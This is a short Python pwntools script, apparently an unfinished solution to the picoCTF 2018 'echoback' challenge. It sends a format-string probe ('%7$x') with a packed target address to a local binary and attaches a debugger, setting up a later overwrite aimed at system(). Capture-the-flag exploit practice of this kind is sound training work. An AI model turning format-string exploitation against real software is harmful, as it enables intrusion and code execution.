#!/usr/bin/python
from pwn import *
import struct

addressToChange = struct.pack("I", 0x804a014)
systemAddress = 0xf7e12200

# s = remote("2018shell3.picoctf.com", 22462)
s = process("./echoback")

print s.recvuntil(":")

padding = ""
padding += addressToChange
padding += "%7$x"

gdb.attach(s, "x/x 0x804a00c")
s.sendline(padding)
print s.recvall()

s.wait_for_close()